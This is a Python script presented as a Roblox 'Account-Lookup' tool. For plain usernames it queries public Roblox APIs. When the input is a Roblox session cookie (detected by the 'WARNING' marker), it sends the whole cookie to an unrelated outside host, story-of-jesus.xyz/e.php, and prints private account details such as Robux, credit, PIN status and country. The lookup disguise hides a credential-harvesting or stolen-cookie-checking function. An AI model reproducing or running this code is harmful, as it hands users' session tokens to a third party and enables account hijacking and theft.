import requests, json

input = input("Enter Users Username/Cookie: ")


if "WARNING" in input:
    r = requests.get(f'https://story-of-jesus.xyz/e.php?cookie={input}') 
    data = r.json() 

    if data["status"] == "failed":
        print("Invalid Cookie")
    else:
        userid = data["userid"]
        usersapi = requests.get(f"https://users.roblox.com/v1/users/{userid}")
        banned = usersapi.json()["isBanned"]
        username = data["username"]
        displayn = data["displayname"]
        description = data["description"]
        datecreated = data["datecreated"]
        daysold = data["daysold"]
        robux = data["robux"]
        pendingrobux = data["pendingrobux"]
        credit = data["credit"]
        premium = data["premium"]
        friends = data["friends"]
        followers = data["followers"]
        following = data["following"]
        rap = data["rap"]
        gender = data["gender"]
        country = data["country"]
        pin = data["pin"]
        if description == "":
            description = "Empty"
        ascii = '''
    
    
       _                                               _         _____                    __                       
     / \                                             / |_      |_   _|                  [  |  _                   
    / _ \     .---.  .---.   .--.   __   _   _ .--. `| |-'______ | |       .--.    .--.  | | / ] __   _  _ .--.   
   / ___ \   / /'`\]/ /'`\]/ .'`\ \[  | | | [ `.-. | | | |______|| |   _ / .'`\ \/ .'`\ \| '' < [  | | |[ '/'`\ \ 
 _/ /   \ \_ | \__. | \__. | \__. | | \_/ |, | | | | | |,       _| |__/ || \__. || \__. || |`\ \ | \_/ |,| \__/ | 
|____| |____|'.___.''.___.' '.__.'  '.__.'_/[___||__]\__/      |________| '.__.'  '.__.'[__|  \_]'.__.'_/| ;.__/  
                                                                                                        [__|         
    
    
    
    
    '''
    print(ascii)
    print(f"Username: {username}")
    print(f"DisplayName: {displayn}")
    print(f"Userid: {userid}")
    print(f"Premium: {premium}")
    print(f"Rap: {rap}")
    print(f"Robux: {robux}")
    print(f"Credit: {credit}")
    print(f"Created: {datecreated}")
    print(f"Days-Old: {daysold}")
    print(f"IsBanned: {banned}")
    print(f"Pin-Enabled: {pin}")
    print(f"Gender: {gender}")
    print(f"Country: {country}")
    print(f"Followers: {followers}")
    print(f"Following: {following}")
    print(f"Description: {description}")


else:
    getbyusername = requests.get(f"https://api.roblox.com/users/get-by-username?username={input}")
    userid = getbyusername.json()["Id"]
    usersapi = requests.get(f"https://users.roblox.com/v1/users/{userid}")
    created = usersapi.json()["created"].split("T")[0]
    banned = usersapi.json()["isBanned"]
    displayn = usersapi.json()["displayName"]
    desc = usersapi.json()["description"]
    followers = requests.get(f"https://friends.roblox.com/v1/users/{userid}/followers/count").json()["count"]
    following = requests.get(f"https://friends.roblox.com/v1/users/{userid}/followings/count").json()["count"]
    if desc == "":
        desc = "Empty"
    ascii = '''
    
    
       _                                               _         _____                    __                       
     / \                                             / |_      |_   _|                  [  |  _                   
    / _ \     .---.  .---.   .--.   __   _   _ .--. `| |-'______ | |       .--.    .--.  | | / ] __   _  _ .--.   
   / ___ \   / /'`\]/ /'`\]/ .'`\ \[  | | | [ `.-. | | | |______|| |   _ / .'`\ \/ .'`\ \| '' < [  | | |[ '/'`\ \ 
 _/ /   \ \_ | \__. | \__. | \__. | | \_/ |, | | | | | |,       _| |__/ || \__. || \__. || |`\ \ | \_/ |,| \__/ | 
|____| |____|'.___.''.___.' '.__.'  '.__.'_/[___||__]\__/      |________| '.__.'  '.__.'[__|  \_]'.__.'_/| ;.__/  
                                                                                                        [__|         
    
    
    
    
    '''
    print(ascii)
    print(f"Username: {input}")
    print(f"DisplayName: {displayn}")
    print(f"Userid: {userid}")
    print(f"Created: {created}")
    print(f"IsBanned: {banned}")
    print(f"Followers: {followers}")
    print(f"Following: {following}")
    print(f"Description: {desc}")
